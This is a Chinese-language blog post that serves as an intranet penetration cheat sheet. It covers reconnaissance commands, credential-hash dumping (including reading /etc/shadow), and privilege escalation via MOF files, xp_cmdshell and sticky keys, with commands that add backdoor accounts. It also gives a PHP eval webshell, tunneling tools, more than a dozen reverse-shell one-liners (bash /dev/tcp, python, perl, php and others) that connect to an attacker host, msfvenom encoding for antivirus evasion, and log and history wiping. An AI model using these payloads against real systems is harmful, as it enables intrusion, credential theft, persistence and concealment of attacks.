<!DOCTYPE html>


<html lang="en">


<head>
  <meta charset="utf-8" />
    
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <title>
    内网渗透 |  
  </title>
  <meta name="generator" content="hexo-theme-ayer">
  
  <link rel="shortcut icon" href="/img.jpg" />
  
  <link rel="stylesheet" href="/dist/main.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
  <link rel="stylesheet" href="/css/custom.css">
  
  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
  
  

  

</head>

</html>

<body>
  <div id="app">
    
      
    <main class="content on">
      <section class="outer">
  <article
  id="post-内网渗透"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
  内网渗透
</h1>
 

    </header>
     
    <div class="article-meta">
      <a href="/2020/01/07/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="article-date">
  <time datetime="2020-01-07T07:36:31.000Z" itemprop="datePublished">2020-01-07</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
  </div>
  
<div class="word_count">
    <span class="post-time">
        <span class="post-meta-item-icon">
            <i class="ri-quill-pen-line"></i>
            <span class="post-meta-item-text"> Word count:</span>
            <span class="post-count">2.5k</span>
        </span>
    </span>

    <span class="post-time">
        &nbsp; | &nbsp;
        <span class="post-meta-item-icon">
            <i class="ri-book-open-line"></i>
            <span class="post-meta-item-text"> Reading time≈</span>
            <span class="post-count">11 min</span>
        </span>
    </span>
</div>
 
    </div>
      
    <div class="tocbot"></div>




  
    <div class="article-entry" itemprop="articleBody">
       
  <a id="more"></a>



<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><h3 id="1-1-windows"><a href="#1-1-windows" class="headerlink" title="1.1.windows"></a>1.1.windows</h3><ul>
<li><p>1.1.1用户操作</p>
<ul>
<li>query user #查看当前在线的用户<br>whoami #查看当前用户<br>net user #查看当前系统的用户<br>net1 user #查看当前系统的用户<br>net user /domain #查看当前域里面的用户<br>net user administrator    #查看当前用户的详细信息<br>net localgroup #查看本地用户组<br>net localgroup administrators #查看管理组中的成员</li>
</ul>
</li>
<li><p>1.1.2网络操作</p>
<ul>
<li>ipconfig /all #查看当前机器的ip<br>netstat -ano #查看有哪些网络连接端口<br>net view #查看在同一工作组中的机器<br>net view /domain #判断是否有域<br>route print #查看路由表<br>arp -a #查看arp表</li>
</ul>
</li>
<li><p>1.1.3系统操作</p>
<ul>
<li><p>set  #查看系统的环境变量<br>systeminfo  #查看当前操作系统信息，关注【补丁号】！！！！<br>tasklist #查看进程名称以及PID号<br>net start #查看服务</p>
</li>
<li><p>软件安装信息查询<br>dir /a “c:\program files” #查看当前系统的安装的软件<br>dir /a “c:\program files (x86)”</p>
</li>
<li><p>收集hash</p>
<ul>
<li><p>wce</p>
<ul>
<li>lassa.exe获取</li>
</ul>
</li>
<li><p>pwdum7</p>
<ul>
<li>lassa.exe获取</li>
</ul>
</li>
<li><p>mimikatz</p>
<ul>
<li>lassa.exe获取</li>
</ul>
</li>
<li><p>QuarksPwDump</p>
<ul>
<li>lassa.exe获取</li>
</ul>
</li>
<li><p>getpass</p>
<ul>
<li>SAM/system获取</li>
</ul>
</li>
<li><p>SAMinside</p>
<ul>
<li>SAM/system获取</li>
</ul>
</li>
<li><p>破解hash</p>
<ul>
<li><a href="https://www.objectif-securite.ch/en/ophcrack" target="_blank" rel="noopener">https://www.objectif-securite.ch/en/ophcrack</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>1.1.4主动搜集</p>
<ul>
<li><p>搜索文件</p>
<ul>
<li>@echo off<br>set “FileName=password.txt”<br>echo searching..<br>for %%a in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (<br>if exist %%a:\ (<br>for /f “delims=” %%b in (‘dir /a-d /s /b “%%a:*%FileName%” 2^&gt;nul’) do (<br>if /i “%%~nxb” equ “%FileName%” (<br>echo,%%b<br>)<br>)<br>)<br>)</li>
</ul>
</li>
<li><p>判断主机存活</p>
<ul>
<li>@echo off<br>for /l %%i in (1 1 254) do ping -v 4 -n 1 192.168.5.%%i || find “TTL” &gt;&gt;hots.txt<br>pause</li>
</ul>
</li>
</ul>
</li>
<li><p>1.1.5用户习惯收集</p>
<ul>
<li><p>用户桌面信息收集    </p>
<ul>
<li>C:\Users\用户名\Desktop</li>
</ul>
</li>
<li><p>下载目录信息收集</p>
<ul>
<li>C:\Users\用户名\Download\</li>
<li>迅雷</li>
<li>百度云</li>
</ul>
</li>
<li><p>收藏夹信息收集</p>
<ul>
<li><p>chrome</p>
<ul>
<li>C:\Users\用户名\AppData\Local\Google\Chrome\User Data\Default</li>
</ul>
</li>
<li><p>ie</p>
<ul>
<li>C:\Users\用户名\Favorites</li>
</ul>
</li>
<li><p>firefox</p>
</li>
</ul>
</li>
<li><p>浏览器记录收集</p>
</li>
<li><p>聊天工具收集</p>
<ul>
<li>qq</li>
<li>微信</li>
</ul>
</li>
<li><p>系统日志收集</p>
<ul>
<li>登录日志</li>
<li>服务日志</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="1-2-linux"><a href="#1-2-linux" class="headerlink" title="1.2.linux"></a>1.2.linux</h3><ul>
<li><p>ifconfig<br>route #查看路由<br>whoami #<br>id #查看当前用户id<br>id test #查看test用户信息<br>w #查看当前系统活动用户<br>lastlog #查看用户登陆日志<br>grep MemTotal /proc/meminfo #查看系统内存总量</p>
</li>
<li><p>cat /etc/passwd #查看用户列表<br>cat /etc/shadow #获取用户hash<br>cat /etc/group #查看用户组<br>grep -v -E “^#” /etc/passwd | awk -F: ‘$3 == 0 { print $1}’   # 列出超级用户<br>awk -F: ‘($3 == “0”) {print}’ /etc/passwd   #列出超级用户</p>
</li>
<li><p>netstat –an<br>netstat -antlp #查看tcp连接</p>
</li>
<li><p>系统类型和内核版本<br>cat /etc/issue  #查看系统名称<br>cat /etc/lsb-release #查看系统名称、版本号<br>uname -a #查看内核信息<br>ls /root |grep vmlinuz #查看内核信息</p>
</li>
<li><p>进程信息<br>ps aux #查看进程信息<br>ps -ef</p>
</li>
<li><p>安装的软件包和服务<br>dpkg -l #查看安装的软件包<br>rpm -qa #查看安装的软件包<br>cat /etc/service #查看系统存在的服务</p>
</li>
<li><p>用户登录信息<br>/var/log/wtmp<br>/var/log/btmp</p>
</li>
<li><p>服务配置<br>cat /etc/syslog.conf<br>cat /etc/chttp.conf<br>cat /etc/lighttpd.conf<br>cat /etc/cups/cupsd.conf<br>cat /etc/inetd.conf<br>cat /etc/apache2/apache2.conf<br>cat /etc/my.conf<br>cat /etc/httpd/conf/httpd.conf<br>cat /opt/lampp/etc/httpd.conf</p>
</li>
<li><p>网络配置<br>cat /etc/network/interfaces #网卡配置<br>cat /etc/resolv.conf #dns配置<br>hostname #查看主机名</p>
</li>
<li><p>网络拓扑收集<br>arp –a</p>
</li>
<li><p>日志信息收集<br>/var/log/*</p>
<ul>
<li>http日志<br>/var/log/apache2/access.log</li>
<li>mysql日志<br>/var/log/mysql/error.log</li>
<li>apt日志<br>/var/log/apt/history.log</li>
</ul>
</li>
<li><p>/home目录文件信息收集</p>
</li>
</ul>
<h3 id="1-3第三方"><a href="#1-3第三方" class="headerlink" title="1.3第三方"></a>1.3第三方</h3><ul>
<li>ssh</li>
<li>ftp</li>
<li>mail</li>
<li>mysql</li>
<li>mssql</li>
</ul>
<h2 id="2-提权"><a href="#2-提权" class="headerlink" title="2.提权"></a>2.提权</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><ul>
<li><p>系统漏洞，ms系列</p>
<ul>
<li><p>ms08-067</p>
<ul>
<li>rpc</li>
</ul>
</li>
<li><p>ms09-012</p>
<ul>
<li>pr.exe/巴西烤肉提权</li>
</ul>
</li>
<li><p>ms09-020</p>
<ul>
<li>iis5/6</li>
</ul>
</li>
<li><p>ms12-020</p>
<ul>
<li>rdp蓝屏</li>
</ul>
</li>
<li><p>ms17-010</p>
<ul>
<li>永恒之蓝/wannacry</li>
</ul>
</li>
<li><p>cve-2019-0708</p>
<ul>
<li>rdp/命令执行</li>
</ul>
</li>
<li><p><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits</a></p>
</li>
<li><p><a href="https://docs.microsoft.com/zh-cn/security-updates/" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/security-updates/</a></p>
</li>
<li><p>粘滞键提权(sethc.exe)</p>
<ul>
<li>使用cmd.exe覆盖sethc.exe，当在输入密码界面多次shift时，会调用sethc.exe</li>
</ul>
</li>
</ul>
</li>
<li><p>应用程序</p>
<ul>
<li><p>pcanywhere</p>
</li>
<li><p>serv-U</p>
<ul>
<li>默认本地管理端口是：43958，默认管理员：LocalAdministrator，默认密码：#l@$ak#.lk;0@P</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><ul>
<li><p>内核提权</p>
<ul>
<li><p>脏牛漏洞</p>
<ul>
<li>内核版本&gt;2.6</li>
</ul>
</li>
<li><p><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a></p>
</li>
</ul>
</li>
</ul>
<h3 id="服务提权"><a href="#服务提权" class="headerlink" title="服务提权"></a>服务提权</h3><ul>
<li><p>mysql</p>
<ul>
<li><p>UDF提权</p>
<ul>
<li><p>windows</p>
<ul>
<li><p>UDF</p>
<ul>
<li>mysql版本 &lt; 5.1 , UDF导出到系统目录c:/windows/system32/</li>
<li>mysql版本 &gt; 5.1 ，UDF导出到安装路径MySQL\Lib\Plugin\</li>
</ul>
</li>
</ul>
</li>
<li><p>linux</p>
<ul>
<li>/usr/lib/mysql/plugin/</li>
</ul>
</li>
<li><p>要求有写权限，单引号未被过滤</p>
</li>
</ul>
</li>
<li><p>MOF</p>
<ul>
<li><p>windows专属</p>
<ul>
<li>流程：<br>1、 首先找个可写的目录，将我们的MOF文件上传上去。<br>2、 执行以下sql语句，mof文件内的命令便会执行。<br>select load_file(‘C:/wmpub/nullevt.mof’) into dumpfile ‘c:/windows/system32/wbem/mof/nullevt.mof’</li>
<li>mofcomp.exe xxxxx.mof 执行mof文件</li>
<li>调用Imofcompiler接口的$complieFile方法</li>
<li>#pragma namespace(“\\.\root\subscription”)<br>instance of __EventFilter as $EventFilter<br>{<br>EventNamespace = “Root\Cimv2”;<br>Name = “filtP2”;<br>Query = “Select * From __InstanceModificationEvent “<br>“Where TargetInstance Isa \”Win32_LocalTime\” “<br>“And TargetInstance.Second = 5”;<br>QueryLanguage = “WQL”;<br>};<br>instance of ActiveScriptEventConsumer as $Consumer<br>{<br>Name = “consPCSV2”;<br>ScriptingEngine = “JScript”;<br>ScriptText =<br>“var WSH = new ActiveXObject(\”WScript.Shell\”)\nWSH.run(\”net.exe user secist 123 /add\”)“;<br>};<br>instance of __FilterToConsumerBinding<br>{<br>Consumer = $Consumer;<br>Filter = $EventFilter;<br>};</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>mssql</p>
<ul>
<li><p>xp_cmdshell</p>
<ul>
<li>开启：<br>EXEC sp_configure ‘show advanced options’, 1;<br>RECONFIGURE;<br>EXEC sp_configure ‘xp_cmdshell’, 1;<br>RECONFIGURE;</li>
<li>exec xp_cmdshell  ‘net user test test /add’</li>
</ul>
</li>
<li><p>xp_regwrite</p>
</li>
<li><p>xp_regread</p>
</li>
</ul>
</li>
<li><p>tomcat</p>
<ul>
<li>弱口令爆破</li>
</ul>
</li>
</ul>
<h2 id="3-权限维持"><a href="#3-权限维持" class="headerlink" title="3.权限维持"></a>3.权限维持</h2><h3 id="windows-1"><a href="#windows-1" class="headerlink" title="windows"></a>windows</h3><ul>
<li><p>cmd命令</p>
<ul>
<li><p>写webshell</p>
<ul>
<li>1.使用cmd命令写webshell，带有&lt;&gt;以及“空格”的时候，需要使用^进行转义<br>例如：echo ^&lt;?php^ eval($_POST[a]);?^&gt; &gt; shell.php</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="linux-1"><a href="#linux-1" class="headerlink" title="linux"></a>linux</h3><h3 id="cobaltstrike"><a href="#cobaltstrike" class="headerlink" title="cobaltstrike"></a>cobaltstrike</h3><ul>
<li><p>生成后门</p>
<ul>
<li>以管理员方式运行</li>
</ul>
</li>
</ul>
<h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><ul>
<li>meterpreter</li>
<li>msfvenom</li>
<li>exploit</li>
</ul>
<h2 id="4-跨边界传输"><a href="#4-跨边界传输" class="headerlink" title="4.跨边界传输"></a>4.跨边界传输</h2><h3 id="跨边界代理-转发"><a href="#跨边界代理-转发" class="headerlink" title="跨边界代理/转发"></a>跨边界代理/转发</h3><ul>
<li><p>端口转发</p>
<ul>
<li><p>lcx</p>
<ul>
<li><p>listen</p>
<ul>
<li>-listen <local port1>  <local port2></li>
<li>将port1监听到的数据发往port2</li>
</ul>
</li>
<li><p>tran</p>
<ul>
<li>-tran   <local port>   <remote host>  <remote port></li>
<li>将本地port开启监听，并且将监听到的数据发往远程端口</li>
</ul>
</li>
<li><p>slave</p>
<ul>
<li>-slave  <remote host1> <remote port1> <remote host2> <remote port2></li>
<li>将远程主机A的port与远程主机B的port双向转发</li>
</ul>
</li>
</ul>
</li>
<li><p>frp反向代理</p>
<ul>
<li>frps -c frps.ini</li>
<li>frpc -c frpc.ini</li>
</ul>
</li>
</ul>
</li>
<li><p>内网代理</p>
<ul>
<li><p>http tunnel</p>
<ul>
<li><p>reDuh</p>
</li>
<li><p>reGeorg</p>
<ul>
<li>1.python2 安装urllib3库</li>
<li>2.上传tunnel.nosocket.php代理脚本到web服务器</li>
<li>3.访问url，确认web服务器上tunnel.nosocket.php能够执行</li>
<li>4.python2执行reGeorgSocksProxy.py脚本，连接tunnel.nosocket.php</li>
<li>5.配置本地代理，使用代理工具进行sock5代理</li>
</ul>
</li>
</ul>
</li>
<li><p>ssh tunnel</p>
<ul>
<li>xshell直接启动隧道转发</li>
<li>ssh -D设置socket隧道</li>
<li>ssh -L设置端口正向转发</li>
<li>ssh -R设置端口反向连接</li>
</ul>
</li>
<li><p>DNS tunnel</p>
<ul>
<li>dns2tcp</li>
</ul>
</li>
<li><p>pingtunnel</p>
<ul>
<li>服务端-type server</li>
<li>连接端-type client</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><ul>
<li><p>1.nc</p>
<ul>
<li><p>正向连接</p>
<ul>
<li><p>攻击机</p>
<ul>
<li>nc -vv 受害者ip 受害者port</li>
</ul>
</li>
<li><p>受害者</p>
<ul>
<li>nc -lvvp 受害者port -e /bin/bash</li>
</ul>
</li>
</ul>
</li>
<li><p>反向连接</p>
<ul>
<li><p>攻击机</p>
<ul>
<li>nc -lvvp 攻击机port</li>
</ul>
</li>
<li><p>受害者</p>
<ul>
<li>nc -vv 攻击机ip 攻击机port -e /bin/bash</li>
</ul>
</li>
</ul>
</li>
<li><p>聊天/传文件</p>
<ul>
<li><p>发送方</p>
<ul>
<li>nc -lvvp 自己的port &lt; 文件</li>
</ul>
</li>
<li><p>接收方</p>
<ul>
<li>nc -vv 发送方ip 发送方port &gt; 文件</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>2.bash</p>
<ul>
<li><p>接收端(hackip,公网)</p>
<ul>
<li>nc -lvvp 端口</li>
</ul>
</li>
<li><p>发送端(受害者）</p>
<ul>
<li>bash -i &gt;&amp; /dev/tcp/hackip/hack端口 0&gt;&amp;1 </li>
<li>0&lt;&amp;31-;exec 31&lt;&gt;/dev/tcp/hackip/hack端口;sh &lt;&amp;31 &gt;&amp;31 2&gt;&amp;31</li>
</ul>
</li>
</ul>
</li>
<li><p>3.socat</p>
<ul>
<li><p>tcp</p>
<ul>
<li><p>接收端(攻击机)</p>
<ul>
<li>socat TCP-LISTEN:端口 - </li>
</ul>
</li>
<li><p>发送端(靶机)</p>
<ul>
<li><p>linux</p>
<ul>
<li>socat exec:’bash -i’,pty,stderr,setsid,sigint,sane tcp:攻击机ip:攻击机端口</li>
</ul>
</li>
<li><p>windows</p>
<ul>
<li>socat.exe exec:’cmd.exe’,pty,stderr,setsid,sigint,sane tcp:攻击机ip:攻击机端口</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>udp</p>
<ul>
<li><p>接收端(攻击机)</p>
<ul>
<li>socat udp-listen:端口 -</li>
</ul>
</li>
<li><p>发送端(靶机)</p>
<ul>
<li><p>linux</p>
<ul>
<li>socat udp-connect:ip:port exec:’bash -i’,pty,stderr,sane 2&gt;&amp;1&gt;/dev/null &amp;</li>
</ul>
</li>
<li><p>windows</p>
<ul>
<li>socat.exe udp-connect:192.168.5.108:30000 exec:’cmd.exe’,pty,stderr,sane</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>4.python</p>
<ul>
<li><p>接收端(攻击机)</p>
<ul>
<li>nc -lvvp port</li>
</ul>
</li>
<li><p>发送端(靶机)</p>
<ul>
<li>python -c  ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“接收端ip”,接收端端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’</li>
</ul>
</li>
</ul>
</li>
<li><p>5.PHP反弹</p>
<ul>
<li><p>接收端(攻击机)</p>
<ul>
<li>nc -lvvp port</li>
</ul>
</li>
<li><p>发送端(靶机)</p>
<ul>
<li>php -r ‘$sock=fsockopen(“接收端ip”,接收端端口);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</li>
</ul>
</li>
</ul>
</li>
<li><p>6.JAVA反弹</p>
<ul>
<li><p>接收端(攻击机)</p>
<ul>
<li>nc -lvvp port</li>
</ul>
</li>
<li><p>发送端(靶机)</p>
<ul>
<li>r = Runtime.getRuntime() p = r.exec([“/bin/bash”,”-c”,”exec 5&lt;&gt;/dev/tcp/192.168.31.41/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&5; done”] as String[]) p.waitFor()</li>
</ul>
</li>
</ul>
</li>
<li><p>7.perl反弹</p>
<ul>
<li><p>接收端(攻击机)</p>
<ul>
<li>nc -lvvp port</li>
</ul>
</li>
<li><p>发送端(靶机)</p>
<ul>
<li>perl -e ‘use Socket;$i=”ip”;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’</li>
</ul>
</li>
</ul>
</li>
<li><p>8.ruby反弹</p>
<ul>
<li><p>接收端(攻击机)</p>
<ul>
<li>nc -lvvp port</li>
</ul>
</li>
<li><p>发送端(靶机)</p>
<ul>
<li>ruby -r socket -e ‘exit if fork;c=TCPSocket.new(“ip”,”port”);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’</li>
</ul>
</li>
</ul>
</li>
<li><p>9.telnet反弹</p>
<ul>
<li><p>接收端(攻击机)</p>
<ul>
<li>nc -lvvp port</li>
</ul>
</li>
<li><p>发送端(靶机)</p>
<ul>
<li>mknod backpipe p &amp;&amp; telnet ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe</li>
</ul>
</li>
</ul>
</li>
<li><p>10.lua反弹</p>
<ul>
<li><p>接收端(攻击机)</p>
<ul>
<li>nc -lvvp port</li>
</ul>
</li>
<li><p>发送端(靶机)</p>
<ul>
<li>lua -e “local s=require(‘socket’);local t=assert(s.tcp());t:connect(‘ip’,port);while true do local r,x=t:receive();local f=assert(io.popen(r,’r’));local b=assert(f:read(‘*a’));t:send(b);end;f:close();t:close();”</li>
</ul>
</li>
</ul>
</li>
<li><p>11.awk</p>
<ul>
<li><p>接收端(攻击机)</p>
<ul>
<li>nc -lvvp port</li>
</ul>
</li>
<li><p>发送端(靶机)</p>
<ul>
<li>awk ‘BEGIN{s=”/inet/tcp/0/ip/port”;while(1){do{s|&amp;getline c;if(c){while((c|&amp;getline)&gt;0)print $0|&s;close(c)}}while(c!=”exit”);close(s)}}’</li>
</ul>
</li>
</ul>
</li>
<li><p>12.ksh/tsh/zsh/sh</p>
<ul>
<li><p>接收端(攻击机)</p>
<ul>
<li>nc -lvvp port</li>
</ul>
</li>
<li><p>发送端(靶机)</p>
<ul>
<li>ksh -c ‘ksh &gt;/dev/tcp/ip/port 2&gt;&amp;1 &lt;&amp;1’</li>
</ul>
</li>
</ul>
</li>
<li><p>13.通过msfvenom生成反弹shell的payload</p>
<ul>
<li>1.msfvenom -l payloads | grep 工具</li>
<li>2.msfvenom -p payload LHOST=监听机IP LPORT=监听端口</li>
</ul>
</li>
<li><p>14.icmpsh</p>
<ul>
<li><p>接收端</p>
<ul>
<li>./icmpsh-m.py <source IP address> <destination IP address></li>
</ul>
</li>
<li><p>发送端</p>
<ul>
<li>icpmsh.exe -t 接收端ip</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><ul>
<li>1.nc传输</li>
<li>2.上传点上传</li>
<li>3.wget下载</li>
<li>4.脚本php/python/perl/ruby发起请求并读写文件</li>
<li>5.ftp</li>
<li>6.sftp</li>
<li>7.svn</li>
<li>8.git</li>
<li>9.sync</li>
<li>10.powershell</li>
<li>11.net use 挂载盘符</li>
<li>12.bitsadmin</li>
<li>13.scp</li>
</ul>
<h2 id="5-隐匿攻击"><a href="#5-隐匿攻击" class="headerlink" title="5.隐匿攻击"></a>5.隐匿攻击</h2><h3 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h3><ul>
<li><p>msfvenom</p>
<ul>
<li><p>encoder<br>编码器</p>
<ul>
<li><p>-e 编码器 -i 编码次数</p>
</li>
<li><p>多次编码</p>
<ul>
<li>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.5.172 lport=4444 -e x86/shikata_ga_nai -i 15 -f raw | msfvenom -a x86 –platform windows -e x86/alpha_upper -i 10 -f exe -o shell.exe</li>
</ul>
</li>
</ul>
</li>
<li><p>bad-chars<br>花指令</p>
<ul>
<li>-b ‘\x00’</li>
</ul>
</li>
</ul>
</li>
<li><p>the-backdoor-factory</p>
</li>
<li><p>veil</p>
</li>
<li><p>upx</p>
<ul>
<li>加壳</li>
</ul>
</li>
<li><p>.net壳</p>
</li>
<li><p>分离免杀</p>
<ul>
<li>shellcode提取，动态加载</li>
</ul>
</li>
</ul>
<h3 id="msf-cs"><a href="#msf-cs" class="headerlink" title="msf/cs"></a>msf/cs</h3><ul>
<li>msf发往cs</li>
<li>cs发往msf</li>
</ul>
<h2 id="6-横向移动"><a href="#6-横向移动" class="headerlink" title="6.横向移动"></a>6.横向移动</h2><h2 id="7-域渗透"><a href="#7-域渗透" class="headerlink" title="7.域渗透"></a>7.域渗透</h2><h3 id="瞄准域控-DC机-发起攻击"><a href="#瞄准域控-DC机-发起攻击" class="headerlink" title="瞄准域控(DC机)发起攻击"></a>瞄准域控(DC机)发起攻击</h3><h2 id="8-痕迹清理"><a href="#8-痕迹清理" class="headerlink" title="8.痕迹清理"></a>8.痕迹清理</h2><h3 id="windows-2"><a href="#windows-2" class="headerlink" title="windows"></a>windows</h3><h3 id="linux-2"><a href="#linux-2" class="headerlink" title="linux"></a>linux</h3><ul>
<li>/var/log/btmp</li>
<li>/var/log/wtmp</li>
<li>~/.bash_history</li>
<li>history -c</li>
</ul>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li></ul>

    </footer>
  </div>

   
  <nav class="article-nav">
    
      <a href="/2020/08/22/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E6%8E%A7%E5%88%B6%E4%B8%AD%E5%BF%83%E2%80%94%E2%80%94%E2%80%94%E2%80%94eval%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="article-nav-link">
        <strong class="article-nav-caption">上一篇</strong>
        <div class="article-nav-title">
          
            深信服EDR控制中心————eval代码执行
          
        </div>
      </a>
    
    
      <a href="/2019/08/30/e5-88-a9-e7-94-a8powershell-e9-9a-90-e8-97-8f-e6-89-a7-e8-a1-8c-e5-90-8e-e9-97-a8/" class="article-nav-link">
        <strong class="article-nav-caption">下一篇</strong>
        <div class="article-nav-title">利用powershell隐藏执行后门</div>
      </a>
    
  </nav>

  
     
</article>

</section>
      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2018-2021
        <i class="ri-heart-fill heart_icon"></i> rich4rd
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>Visitors:<span id="busuanzi_value_site_uv"></span></s>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>Views:<span id="busuanzi_value_page_pv"></span></span>
</span>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1279215658&amp;web_id=1279215658'></script>
        
      </li>
    </ul>
  </div>
</footer>
      <div class="float_btns">
        <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

      </div>
    </main>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/img.jpg" alt="rich4rd&#39;s blog"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags/HW/">HW行动</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories/Web%E5%AE%89%E5%85%A8/">web安全</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories/linux/">linux</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="Search">
        <i class="ri-search-line"></i>
      </a>
      
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <script>
      if (window.matchMedia("(max-width: 768px)").matches) {
        document.querySelector('.content').classList.remove('on');
        document.querySelector('.sidebar').classList.remove('on');
      }
    </script>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i></p>
  <div class="reward-box">
    
    
  </div>
</div>
    <script src="/js/jquery-2.0.3.min.js"></script>
<script src="/js/lazyload.min.js"></script>
<!-- Tocbot -->

<script src="/js/tocbot.min.js"></script>
<script>
  tocbot.init({
    tocSelector: '.tocbot',
    contentSelector: '.article-entry',
    headingSelector: 'h1, h2, h3, h4, h5, h6',
    hasInnerContainers: true,
    scrollSmooth: true,
    scrollContainer: 'main',
    positionFixedSelector: '.tocbot',
    positionFixedClass: 'is-position-fixed',
    fixedSidebarOffset: 'auto'
  });
</script>

<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
<script src="/dist/main.js"></script>
<!-- ImageViewer -->

<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

